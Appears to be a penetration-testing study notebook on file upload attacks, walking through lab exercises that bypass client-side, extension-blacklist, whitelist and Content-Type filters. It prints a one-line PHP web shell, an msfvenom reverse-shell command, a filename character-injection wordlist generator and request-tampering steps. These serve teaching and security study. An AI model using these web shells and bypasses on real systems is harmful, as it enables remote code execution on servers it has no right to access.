# File Upload Attacks

# **Intro to File Upload Attacks**

<aside>
💡 Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.

</aside>

> File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications, as we can see in the latest [CVE Reports](https://www.cvedetails.com/vulnerability-list/cweid-434/vulnerabilities.html). We will also notice that most of these vulnerabilities are scored as `High` or `Critical` vulnerabilities, showing the level of risk caused by insecure file upload.
> 

## **Types of File Upload Attacks**

<aside>
💡 The most common reason behind file upload vulnerabilities is weak file validation and verification, which may not be well secured to prevent unwanted file types or could be missing altogether. The worst possible kind of file upload vulnerability is an `unauthenticated arbitrary file upload` vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.

</aside>

> The most common and critical attack caused by arbitrary file uploads is `gaining remote command execution` over the back-end server by uploading a web shell or uploading a script that sends a reverse shell.
> 

> In some cases, we may not have arbitrary file uploads and may only be able to upload a specific file type. Even in these cases, there are various attacks we may be able to perform to exploit the file upload functionality if certain security protections were missing from the web application.
> 
> - Examples of these attacks include:
> - Introducing other vulnerabilities like `XSS` or `XXE`.
> - Causing a `Denial of Service (DoS)` on the back-end server.
> - Overwriting critical system files and configurations.

> Finally, a file upload vulnerability is not only caused by writing insecure functions but is also often caused by the use of outdated libraries that may be vulnerable to these attacks.
> 

# **Basic Exploitation**

## **Absent Validation**

<aside>
💡 The most basic type of file upload vulnerability occurs when the web application `does not have any form of validation filters` on the uploaded files, allowing the upload of any file type by default.

</aside>

> `Employee File Manager` web application, which allows us to upload personal files to the web application:
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled.png)
> 
> The web application does not mention anything about what file types are allowed, and we can drag and drop any file we want, and its name will appear on the upload form, including `.php` files
> 
> > Furthermore, if we click on the form to select a file, the file selector dialog does not specify any file type, as it says `All Files` for the file type, which may also suggest that no type of restrictions or limitations are specified for the web application:
> > 
> > 
> > ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%201.png)
> > 

### **Identifying Web Framework**

> Many kinds of scripts can help us exploit web applications through arbitrary file upload, most commonly a `Web Shell` script and a `Reverse Shell` script.
> 
> 
> > A web shell has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts. So, the first step would be to identify what language runs the web application.
> > 
> 
> One easy method to determine what language runs the web application is to visit the `/index.ext` page, where we would swap out `ext` with various common web extensions, like `php`, `asp`, `aspx`, among others, to see whether any of them exist.
> 
> > Several other techniques may help identify the technologies running the web application, like using the [Wappalyzer](https://www.wappalyzer.com/) extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application:
> > 
> > 
> > ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%202.png)
> > 

### **Vulnerability Identification**

> As an initial test to identify whether we can upload arbitrary `PHP` files, let's create a basic `Hello World` script to test whether we can execute `PHP` code with our uploaded file.
> 
> 
> To do so, we will write `<?php echo "Hello HTB";?>` to `test.php`, and try uploading it to the web application:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%203.png)
> 

## **Upload Exploitation**

<aside>
💡 The final step in exploiting this web application is to upload the malicious script in the same language as the web application, like a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we should be able to interact with it to take control over the back-end server.

</aside>

### **Web Shells**

> We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for `PHP` is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell.
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%204.png)
> 

### **Writing Custom Web Shell**

<aside>
💡 Although using web shells from online resources can provide a great experience, we should also know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed.

</aside>

> For example, with `PHP` web applications, we can use the `system()` function that executes system commands and prints their output, and pass it the `cmd` parameter with `$_REQUEST['cmd']`, as follows:
> 
> 
> ```php
> <?php system($_REQUEST['cmd']); ?>
> ```
> 

### **Generating Custom Reverse Shell Scripts**

> Just like web shells, we can also create our own reverse shell scripts. While it is possible to use the same previous `system` function and pass it a reverse shell command, this may not always be very reliable, as the command may fail for many reasons, just like any other reverse shell command.
> 

> Luckily, tools like `msfvenom` can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows for `PHP`:
> 
> 
> ```php
> 0xR3Y4D@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
> ...SNIP...
> Payload size: 3033 bytes
> ```
> 

# **Bypassing Filters**

## Bypassing Client-Side Filters

### 1 ⇒ Turn off **`Javascript`** in your browser.

### 2 ⇒ Intercept and modify the incoming page:

- **Using Burp suite, we can intercept the incoming web page and strip out the `Javascript` filter before it has a chance to run. The process for this will be covered below.**

![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%205.png)

- **It's worth noting here that Burp suite will not, by default, intercept any external `Javascript` files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burp suite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove `^js$|`**
    
    ![95hi6pX.png](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/95hi6pX.png)
    

### 3 ⇒ I**ntercept and modify the file upload:**

- **Where the previous method works *before* the web page is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.**
- **Upload your shell named “`shell.jpeg`” the MIME filtering will put the header `content-type: image/jpeg` we now out of the filtration stage we can change the file name to “`shell.php`” and 
`content-type: text/x-php`**

![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%206.png)

### 4 ⇒ Send the file directly to the upload point.

- Why use the webpage with the filter, when you can send the file directly using a tool like **`curl`**? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: 
**`curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`** To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

## Bypassing Server-Side Filters

<aside>
💡 MIME Validation Bypass

</aside>

- **You can use another extension if the server blocks specific extensions like (PHP, phtml) you can use php3, php4, php5 and more but the server may can’t recognize these files as PHP files (will be a text files) it’s worth trying more extensions like `.phar`**
- **In the previous example we saw that the code was using the `pathinfo()` PHP function to get the last few characters after the `.`, but what happens if it filters the input slightly differently? Let's try uploading a file called `shell.jpg.php`. We already know that JPEG files are accepted, so what if the filter is just checking to see if the `.jpg` file extension is somewhere within the input? Pseudocode for this kind of filter may look something like this:**

```php
**ACCEPT FILE FROM THE USER -- 
SAVE FILENAME IN VARIABLE userInput

IF STRING ".jpg" IS IN VARIABLE userInput:
    SAVE THE FILE
ELSE:
    RETURN ERROR MESSAGEpilgrimage.htb**
```

<aside>
💡 Magic number  Validation Bypass

</aside>

- Type any four character in the first line
- Magic number:

[List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

- use **`hexeditor filename`  to change the magic number without changing the extension**
    
    ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%207.png)
    
    ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%208.png)
    
    ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%209.png)
    
    ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2010.png)
    
    ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2011.png)
    

<aside>
💡 Time To Be Real

</aside>

---

---

## **Client-Side Validation Intro**

<aside>
💡 Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).

</aside>

> However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.
> 

### **Client-Side Validation**

> The exercise at the end of this section shows a basic `Profile Image` functionality, frequently seen in web applications that utilize user profile features, like social media web applications:
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2012.png)
> 
> However, this time, when we get the file selection dialog, we cannot see our `PHP` scripts (or it may be greyed out), as the dialog appears to be limited to image formats only:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2013.png)
> 
> We may still select the `All Files` option to select our `PHP` script anyway, but when we do so, we get an error message saying (`Only images are allowed!`), and the `Upload` button gets disabled
> 
> > Luckily, all validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting our file. So, we should be able to have complete control over these client-side validations.
> > 
> 
> Any code that runs on the client-side is under our control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser. If the web application does not apply any of these validations on the back-end, we should be able to upload any file type.
> 
> > As mentioned earlier, to bypass these protections, we can either `modify the upload request to the back-end server`, or we can `manipulate the front-end code to disable these type validations`.
> > 

### **Back-end Request Modification**

> Let's start by examining a normal request through `Burp`. When we select an image, we see that it gets reflected as our profile image, and when we click on `Upload`, our profile image gets updated and persists through refreshes.
> 
> 
> If we capture the upload request with `Burp`, we see the following request being sent by the web application:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2014.png)
> 
> The web application appears to be sending a standard HTTP upload request to `/upload.php`. This way, we can now modify this request to meet our needs without having the front-end type validation restrictions. If the back-end server does not validate the uploaded file type, then we should theoretically be able to send any file type/content, and it would be uploaded to the server.
> 
> > The two important parts in the request are `filename="HTB.png"` and the file content at the end of the request. If we modify the `filename` to `shell.php` and modify the content to the web shell we used in the previous section; we would be uploading a `PHP` web shell instead of an image.
> > 
> 
> So, let's capture another image upload request, and then modify it accordingly:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2015.png)
> 
> As we can see, our upload request went through, and we got `File successfully uploaded` in the response. So, we may now visit our uploaded file and interact with it and gain remote code execution.
> 

### **Disabling Front-end Validation**

> Another method to bypass client-side validations is through manipulating the front-end code. As these functions are being completely processed within our web browser, we have complete control over them. So, we can modify these scripts or disable them entirely.
> 

> To start, we can click [`CTRL+SHIFT+C`] to toggle the browser's `Page Inspector`, and then click on the profile image, which is where we trigger the file selector for the upload form:
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2016.png)
> 
> This will highlight the following HTML file input on line `18`:
> 
> ```php
> <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
> ```
> 
> The more interesting part is `onchange="checkFile(this)"`, which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation. To get the details of this function, we can go to the browser's `Console` by clicking [`CTRL+SHIFT+K`], and then we can type the function's name (`checkFile`) to get its details:
> 
> ```php
> function checkFile(File) {
> ...SNIP...
>     if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
>         $('#error_message').text("Only images are allowed!");
>         File.form.reset();
>         $("#submit").attr("disabled", true);
>     ...SNIP...
>     }
> }
> ```
> 
> Luckily, we do not need to get into writing and modifying JavaScript code. We can remove this function from the HTML code since its primary use appears to be file type validation, and removing it should not break anything.
> 

> Once we upload our web shell using either of the above methods and then refresh the page, we can use the `Page Inspector` once more with [`CTRL+SHIFT+C`], click on the profile image, and we should see the URL of our uploaded web shell:
> 
> 
> ```php
> <img src="/profile_images/shell.php" class="profile-image" id="profile-image">
> ```
> 

## **Blacklist Filters**

<aside>
💡 If the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.

</aside>

### **Blacklisting Extensions**

> Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and filename with our PHP script's, and forward the request:
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2017.png)
> 
> As we can see, our attack did not succeed this time, as we got `Extension not allowed`. This indicates that the web application may have some form of file type validation on the back-end, in addition to the front-end validations.
> 
> There are generally two common forms of validating a file extension on the back-end:
> 
> 1. Testing against a `blacklist` of types
> 2. Testing against a `whitelist` of types
> 
> > The validation may also check the `file type` or the `file content` for type matching. The weakest form of validation amongst these is `testing the file extension against a blacklist of extension` to determine whether the upload request should be blocked. For example, the following piece of code checks if the uploaded file extension is `PHP` and drops the request if it is:
> > 
> > 
> > ```php
> > $fileName = basename($_FILES["uploadFile"]["name"]);
> > $extension = pathinfo($fileName, PATHINFO_EXTENSION);
> > $blacklist = array('php', 'php7', 'phps');
> > 
> > if (in_array($extension, $blacklist)) {
> >     echo "File type not allowed";
> >     die();
> > }
> > ```
> > 
> 
> The code is taking the file extension (`$extension`) from the uploaded file name (`$fileName`) and then comparing it against a list of blacklisted extensions (`$blacklist`). However, this validation method has a major flaw. `It is not comprehensive`, as many other extensions are not included in this list, which may still be used to execute PHP code on the back-end server if uploaded.
> 

### **Fuzzing Extensions**

> As the web application seems to be testing the file extension, our first step is to fuzz the upload functionality with a list of potential extensions and see which of them return the previous error message.
> 
> 
> There are many lists of extensions we can utilize in our fuzzing scan. `PayloadsAllTheThings` provides lists of extensions for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) web applications. We may also use `SecLists` list of common [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2018.png)
> 
> We'll keep the file content for this attack, as we are only interested in fuzzing file extensions. Finally, we can `Load` the PHP extensions list from above in the `Payloads` tab under `Payload Options`. We will also un-tick the `URL Encoding` option to avoid encoding the (`.`) before the file extension. Once this is done, we can click on `Start Attack` to start fuzzing for file extensions that are not blacklisted:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2019.png)
> 
> We can sort the results by `Length`, and we will see that all requests with the Content-Length (`193`) passed the extension validation, as they all responded with `File successfully uploaded`. In contrast, the rest responded with an error message saying `Extension not allowed`.
> 

### **Non-Blacklisted Extensions**

> Now, we can try uploading a file using any of the `allowed extensions` from above, and some of them may allow us to execute PHP code. `Not all extensions will work with all web server configurations`, so we may need to try several extensions to get one that successfully executes PHP code.
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2020.png)
> 

## **Whitelist Filters**

<aside>
💡 A whitelist is generally more secure than a blacklist. The web server would only allow the specified extensions, and the list would not need to be comprehensive in covering uncommon extensions.

</aside>

### **Whitelisting Extensions**

> Let's start the exercise at the end of this section and attempt to upload an uncommon PHP extension, like `.phtml`, and see if we are still able to upload it as we did in the previous section:
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2021.png)
> 
> so let's try to fuzz for allowed extensions as we did in the previous section, using the same wordlist that we used previously:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2022.png)
> 
> We can see that all variations of PHP extensions are blocked (e.g. `php5`, `php7`, `phtml`). However, the wordlist we used also contained other 'malicious' extensions that were not blocked and were successfully uploaded. So, let's try to understand how we were able to upload these extensions and in which cases we may be able to utilize them to execute PHP code on the back-end server.
> 
> The following is an example of a file extension whitelist test:
> 
> Code: php
> 
> ```php
> $fileName = basename($_FILES["uploadFile"]["name"]);
> 
> if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
>     echo "Only images are allowed";
>     die();
> }
> ```
> 
> We see that the script uses a Regular Expression (`regex`) to test whether the filename contains any whitelisted image extensions. The issue here lies within the `regex`, as it only checks whether the file name `contains` the extension and not if it actually `ends` with it. Many developers make such mistakes due to a weak understanding of regex patterns.
> 

### **Double Extensions**

> The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through `Double Extensions`. For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2023.png)
> 
> Now, if we visit the uploaded file and try to send a command, we can see that it does indeed successfully execute system commands, meaning that the file we uploaded is a fully working PHP script:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2024.png)
> 

> However, this may not always work, as some web applications may use a strict `regex`
 pattern, as mentioned earlier, like the following:
> 
> 
> ```php
> if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
> ```
> 
> This pattern should only consider the final file extension, as it uses (`^.*\.`) to match everything up to the last (`.`), and then uses (`$`) at the end to only match extensions that end the file name. So, the `above attack would not work`. Nevertheless, some exploitation techniques may allow us to bypass this pattern, but most rely on misconfigurations or outdated systems.
> 

### **Reverse Double Extension**

<aside>
💡 In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability.

</aside>

> For example, an organization may use an open-source web application, which has a file upload functionality. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server.
> 
> 
> > For example, the `/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2` web server may include the following configuration:
> > 
> > 
> > ```php
> > <FilesMatch ".+\.ph(ar|p|tml)">
> >     SetHandler application/x-httpd-php
> > </FilesMatch>
> > ```
> > 
> > The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches `.phar`, `.php`, and `.phtml`. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with (`$`). In such cases, any file that contains the above extensions will be allowed PHP code execution, even if it does not end with the PHP extension. For example, the file name (`shell.php.jpg`) should pass the earlier whitelist test as it ends with (`.jpg`), and it would be able to execute PHP code due to the above misconfiguration, as it contains (`.php`) in its name.
> > 
> 
> Let's try to intercept a normal image upload request, and use the above file name to pass the strict whitelist test:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2025.png)
> 
> Now, we can visit the uploaded file, and attempt to execute a command:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2026.png)
> 

### **Character Injection**

> Finally, let's discuss another method of bypassing a whitelist validation test through `Character Injection`. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.
> 
> 
> The following are some of the characters we may try injecting:
> 
> - `%20`
> - `%0a`
> - `%00`
> - `%0d0a`
> - `/`
> - `.\`
> - `.`
> - `…`
> - `:`
> 
> > Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.
> > 
> 
> We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the `PHP` and `JPG` extensions, as follows:
> 
> ```php
> for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
>     for ext in '.php' '.phps'; do
>         echo "shell$char$ext.jpg" >> wordlist.txt
>         echo "shell$ext$char.jpg" >> wordlist.txt
>         echo "shell.jpg$char$ext" >> wordlist.txt
>         echo "shell.jpg$ext$char" >> wordlist.txt
>     done
> done
> ```
> 

## **Type Filters**

<aside>
💡 many modern web servers and web applications also test the content of the uploaded file to ensure it matches the specified type. While extension filters may accept several extensions, content filters usually specify a single category (e.g., images, videos, documents), which is why they do not typically use blacklists or whitelists. This is because web servers provide functions to check for the file content type, and it usually falls under a specific category

</aside>

> There are two common methods for validating the file content: `Content-Type Header` or `File Content`. Let's see how we can identify each filter and how to bypass both of them.
> 

### **Content-Type**

> If we try to upload a `php` file :
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2027.png)
> 
> > We see that we get a message saying `Only images are allowed`. The error message persists, and our file fails to upload even if we try some of the tricks we learned in the previous sections. If we change the file name to `shell.jpg.phtml` or `shell.php.jpg`, or even if we use `shell.jpg` with a web shell content, our upload will fail.
> > 
> 
> As the file extension does not affect the error message, the web application must be testing the file content for type validation. As mentioned earlier, this can be either in the `Content-Type Header` or the `File Content`.
> 
> > The following is an example of how a PHP web application tests the Content-Type header to validate the file type:
> > 
> > 
> > ```php
> > $type = $_FILES['uploadFile']['type'];
> > 
> > if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
> >     echo "Only images are allowed";
> >     die();
> > }
> > ```
> > 
> > The code sets the (`$type`) variable from the uploaded file's `Content-Type` header. Our browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the file extension. However, since our browsers set this, this operation is a client-side operation, and we can manipulate it to change the perceived file type and potentially bypass the type filter.
> > 
> - Fuzzing
>     
>     We may start by fuzzing the Content-Type header with SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) through Burp Intruder, to see which types are allowed. However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to `45` types only (compared to around 700 originally). We can do so as follows:
>     
>     ```php
>     0xR3Y4D@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
>     0xR3Y4D@htb[/htb]$ cat content-type.txt | grep 'image/' > image-content-types.txt
>     ```
>     
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2028.png)
> 
> This time we get `File successfully uploaded`, and if we visit our file, we see that it was successfully uploaded:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Upload%20Attacks%20130ff70883154fac8c35d050cfce5144/Untitled%2029.png)
> 

### **MIME-Type**

<aside>
💡 The second and more common type of file content validation is testing the uploaded file's `MIME-Type`. `Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its general format and bytes structure.

</aside>

